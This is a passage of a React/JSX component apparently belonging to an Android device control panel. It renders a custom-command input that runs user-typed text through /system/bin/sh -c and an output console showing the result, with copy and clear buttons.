              <input value={customCmd} onChange={e => setCustomCmd(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
                disabled={executing}
                placeholder="Custom command (runs via /system/bin/sh -c)…"
                className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-primary outline-none" />
              <button onClick={() => { if (customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
                disabled={executing || !customCmd.trim()}
                className="px-3 py-2 rounded bg-primary/10 border border-primary/40 text-primary hover:bg-primary/20 disabled:opacity-40 transition-colors">
                {executing ? <Loader size={13} className="animate-spin" /> : <Send size={13} />}
              </button>
            </div>

            {/* ── Output console ───────────────────────────────────────── */}
            {outputs.length > 0 && (
              <div className="shrink-0 border border-border rounded-lg overflow-hidden bg-bg" style={{ maxHeight: 220 }}>
                <div className="flex items-center justify-between px-3 py-1.5 bg-surface border-b border-border">
                  <div className="flex items-center gap-2">
                    <Activity size={11} className="text-primary" />
                    <span className="text-[10px] text-primary font-semibold">Output Console</span>
                    <span className={`text-[9px] px-1.5 rounded ${lastOutput?.ok ? 'text-primary bg-primary/10' : 'text-danger bg-danger/10'}`}>
                      {lastOutput?.ok ? '✓ ok' : '✗ err'}
                    </span>
                    <span className="text-[9px] text-muted font-mono">{lastOutput?.cmd}</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <button onClick={() => { navigator.clipboard.writeText(lastOutput?.result ?? ''); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
                      className="text-muted hover:text-primary">
                      {copied ? <CheckCheck size={11} className="text-primary" /> : <Copy size={11} />}
                    </button>
                    <button onClick={() => setOutputs([])} className="text-muted hover:text-danger">
                      <X size={11} />
                    </button>
                  </div>
                </div>
                <div className="overflow-y-auto" style={{ maxHeight: 170 }}>
                  <pre className="px-3 py-2 text-[11px] font-mono text-text whitespace-pre-wrap break-all">
                    {lastOutput?.result}
                  </pre>
                </div>
              </div>
            )}

            {executing && (
              <div className="flex items-center gap-2 text-warn text-xs shrink-0">
                <Loader size={12} className="animate-spin" /> Executing…
              </div>
            )}

          </div>
        )}
      </div>
    </div>
  )
}
